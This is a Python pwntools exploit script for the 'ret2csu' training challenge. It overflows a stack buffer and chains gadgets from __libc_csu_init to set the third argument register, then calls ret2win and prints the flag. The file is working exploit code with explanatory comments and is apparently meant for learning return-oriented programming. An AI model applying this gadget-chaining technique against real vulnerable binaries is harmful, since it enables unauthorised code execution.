from pwn import *

e = ELF('./ret2csu')
p = e.process()

print(p.recv().decode())

# raw_input('attach gdb')

# padding for buffer overflow
padding = b'A' * 40

# ret2win
ret2win = p64(e.symbols['ret2win'])

# arg to ret2win
arg = p64(0xdeadcafebabebeef)

# gadgets found in __libc_csu_init function not listed by ROPGadget

# Used till ret
# mov    rdx,r15
# mov    rsi,r14
# mov    edi,r13d
# call   QWORD PTR [r12+rbx*8]
# add    rbx,0x1
# cmp    rbp,rbx
# jne    0x400880 <__libc_csu_init+64>
# add    rsp,0x8
# pop    rbx
# pop    rbp
# pop    r12
# pop    r13
# pop    r14
# pop    r15
# ret
mov = p64(0x400880)

# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret 
pop = p64(0x40089a)

payload = padding
payload += pop

# rbx -> 0
payload += p64(0)

# rbp -> 1 (for cmp rbp, rbx later)
payload += p64(0x1)

# r12 -> address where address of _init is stored found in _DYNAMIC section
# a simple function had to be called which did not manipulate any registers and
# the address where address of such a function is to be stored in r12
payload += p64(0x600e38)

# r13, r14 -> junk
payload += p64(0x3131313131313131)
payload += p64(0x3131313131313131)

# r15 -> gets moved to rdx which is arg
payload += arg

payload += mov
# cmp is made true by setting rbp 1 to avoid jumping
# 7 junk values are saved to slide down the pops in the chain
payload += p64(0) * 7

# mov chain rets to the value at top of stack
payload += ret2win

p.sendline(payload)
flag = p.recv().decode()
success(flag)